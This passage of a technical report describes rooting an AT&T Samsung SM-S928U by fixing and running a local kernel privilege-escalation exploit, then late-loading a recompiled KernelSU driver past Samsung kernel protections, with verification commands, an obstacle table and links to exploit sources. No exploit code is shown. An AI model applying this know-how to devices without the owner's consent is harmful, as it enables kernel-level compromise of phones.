adb shell 'grep -i kernelsu /proc/modules'
adb shell 'su -c id'
adb shell getenforce
```

If `su` works, inspect and remove the temporary bind mount **only if present**:

```bash
adb shell 'su -c "grep -F /system/bin/logcat /proc/self/mountinfo || true"'
adb shell 'su -c "umount /system/bin/logcat"'     # only when the mount exists
adb logcat -d -t 2
```

Final acceptance criteria: `kernelsu` in `/proc/modules`; `su -c id` returns root under `u:r:ksu:s0`; `getenforce` is `Enforcing`; no `/system/bin/logcat` bind mount remains; stock `logcat` runs; KernelSU Manager reports driver version **32525**.

## 8. Technical obstacles and how they were resolved

The following are the material **device/platform/porting/build** problems encountered. Routine shell-command typos and incidental user/operator automation mistakes are intentionally excluded.

| Obstacle observed | Diagnostic evidence | Resolution / result |
|---|---|---|
| Stock app did not recognize carrier model `SM-S928U` | `No compatible payload supports this model and kernel version` | Used exact E3Q DZF2 native target and local exploit runner after comparing runtime kernel and boot-image hash with the U1 reference |
| Manually selected upstream exploit did not obtain root and an early run rebooted | Early log `triggered=0 verified=0`, physical read/write `done=0 root=0` | Examined native payload path and built corrected stable `.so` |
| Stack-writer readiness flag did not match stable exploit's checked flag | Two reads of `slide_pselect_write_window` despite `slide_stack_write_window` being signaled | Corrected two gates and rebuilt; next controlled successful log shows `triggered=1 verified=1`, `uid=2000->0` |
| Published E3Q Samsung KernelSU late-load failed on this AT&T runtime | Samsung ramdumps: `try_module_get` panic; later `KernelSU: patch syscall 42` adjacent to watchdog diagnostic | Recompiled Samsung-specific driver with `CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y`; kernel survived and `su` worked |
| Samsung KDP/RKP/DEFEX and trimmed symbols constrain normal module loading | Target-specific patch, kernel symbol/import audit, manual relocation design | Reused published Samsung patch and exact DDK/KMI, matched `vermagic`, embedded modified `.ko` in custom loader |
| Rust Android userspace build needed a resolved Git dependency | `Kernel-SU/adb_client` dependency unavailable at historical address | Local Git URL redirect and pinned Cargo build |
| Published helper passed a CLI option incompatible with local v3.2.5 `ksud` | `unexpected argument '--ephemeral'`, CLI offered `late-load` | Device-side shell script calling `late-load --allow-shell` through temporary `logcat` bind mount |
| First successful module version was rejected by Manager | Manager **32525**, driver **30001**, minimum **32523** | Diagnosed shallow history: `KSU_VERSION = 30000 + commit count`; fetched full Git history, rebuilt driver and embedded loader to **32525** |
| Temporary loader bind mount remained after working root | `/proc/self/mountinfo` mapped `/system/bin/logcat` to custom loader | `su -c 'umount /system/bin/logcat'`; original `logcat` and KernelSU both verified |
| Root did not persist across reboot | Late-load injects a module into RAM; stock bootloader stayed locked | Reused the one-attempt bootstrap and loader procedure on the next boot; no persistent flashed boot modification was claimed |

## 9. Diagnostic evidence files retained in the archived work

The directory now called `Samsung Root leftovers` is the earlier development workspace. Particularly valuable retained evidence includes:

```text
cve43499-patched-test.log
cve43499-stable-test.log
RootMyGalaxy-20261015-202717-failed.log.txt            (also supplied separately during this project)
dumpstate_lastkmsg_20_20261015_215412_KP.log.gz
dumpstate_lastkmsg_21_20261015_223208_WP.log.gz
s928u-ksu-build.log
s928u-ksud-build.log
s928u-ksu-v32525-build.log
Root-My-Galaxy-Payloads/                       (locally modified native source)
KernelSU-v3.2.5/                               (locally modified Samsung/no-patch-text source)
ksu-git-redirects.conf                         (Rust dependency URL redirects)
KernelSU_v3.2.5_32525-release.apk
```

The files named `dumpstate_lastkmsg_*.log.gz` are, in the supplied evidence, actually **ZIP-format Samsung diagnostic bundles despite the `.gz` extension**. They contain entries such as `dumpstate_lastkmsg.lst`, `eRR.p`, and `reset_summary.html`. The **KP** bundle was associated with the `try_module_get` fatal exception; the **WP** bundle retained the original KernelSU syscall-patch log and watchdog diagnostics. Their diagnostic value is greater than the misleading filename extension.

## 10. Boundaries and facts not established

1. **Original installed firmware/kernel:** not preserved. The October 1 DZI1 public release is context only. No guess about the exact earlier `uname -r` is asserted.
2. **Windows Odin detail:** exact Odin version, Windows build, chosen `CSC` versus `HOME_CSC`, and `USERDATA` usage were not captured; §3 clearly separates standard Odin procedure from verified action.
3. **Generalizability:** only one AT&T **`SM-S928U`** on exact **DZF2** was demonstrated. The public E3Q support/validation record for **`SM-S928U1`** is related evidence, **not** direct evidence that this custom no-patch-text module works on every other variant.
4. **Exact source reproducibility:** original local patched repositories were preserved by the operator, but they were not packaged into this Markdown; the complete KernelSU source diff (beyond file list, named patch, and configuration) is not included. The final binary hashes are the authoritative fingerprints of this specific build.
5. **Crash causation:** early module failures happened around hooks/fops operations. The correlation with live text patching motivated a successful no-patch-text build, but the logs do not isolate a unique root cause beyond doubt.
6. **Persistence:** this method remains a **temporary late-loaded module**, not a bootloader unlock, factory flashing bypass, permanent kernel replacement, or successful persistent-root installation.

## 11. Five primary external links

Only five external URLs are listed; subfiles, commits, and patches are identified by path or hash above so the document stays compact to cross-post.

1. **Samsung official SM-S928U firmware update history** — dated firmware chronology, including the October 1 DZI1 release and June DZF2 release: https://doc.samsungmobile.com/SM-S928U/029130240223/wel.html
2. **AT&T SM-S928U firmware archive (SamFw)** — exact carrier model, revision-6 firmware lineup, One UI branch, AP/BL/CP/CSC identifiers: https://samfw.com/firmware/SM-S928U/ATT/
3. **Root My Galaxy app source** — app's exact model/kernel selection rules and manual profile behavior: https://github.com/BuSung-dev/Root-My-Galaxy
4. **Root My Galaxy Payloads source** — pinned native exploit, target files, published E3Q/KDP binaries, Samsung-specific patches and the detailed `docs/SM-S928U1-S928U1UES6DZF2.md` reference: https://github.com/BuSung-dev/Root-My-Galaxy-Payloads
5. **KernelSU source and releases** — v3.2.5 base, Kbuild version calculation, module/manager/`ksud` source: https://github.com/tiann/KernelSU

---

**Recorded final status:** On **16 October 2026**, the user confirmed that the AT&T SM-S928U had no KernelSU Manager errors. KernelSU v32525 was active, `su` worked, SELinux was Enforcing, and the system `logcat` binary had been restored after the temporary bind mount. This is the final, successfully tested state documented here.
